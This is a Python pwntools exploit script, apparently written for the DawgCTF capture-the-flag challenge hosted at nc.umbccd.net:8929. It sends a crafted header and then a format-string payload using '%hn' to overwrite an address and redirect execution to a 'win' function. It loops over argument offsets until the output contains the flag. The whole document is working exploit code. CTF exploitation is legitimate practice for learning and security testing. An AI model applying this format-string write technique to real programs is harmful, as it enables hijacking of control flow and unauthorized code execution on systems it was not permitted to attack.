#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('out', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)
# nc.umbccd.net:8929
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x040137C 
        b*0x40146a
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('nc.umbccd.net', 8929)
else:
    p = process([exe.path])
GDB()
# 0x404030
load = flat(
    p32(0x564D576E),
    p32(0x50),
    p32(0x10)
)
s(load)
win = 0x401244
load = flat(
    f'%{0x1244}c%{11}$hn',
)
s(load.ljust(0x60,b'\0'))
input()
i = 6
while True:
    i+=1
    info(f'i: {i}')
    if args.REMOTE:
        p = remote('nc.umbccd.net', 8929)
    else:
        p = process([exe.path])
    load = flat(
        p32(0x564D576E),
        p32(0x50),
        p32(0x10)
    )
    s(load)
    win = 0x401244
    load = flat(
        f'%{0x1244}c%{i}$hn',
    )
    s(load.ljust(0x60,b'\0'))

    try:
        out = p.recvall()
        if b'DawgCTF{' in out:
            print(out)
            p.interactive()
            break
        else:
            p.close()
    except EOFError:
        p.close()
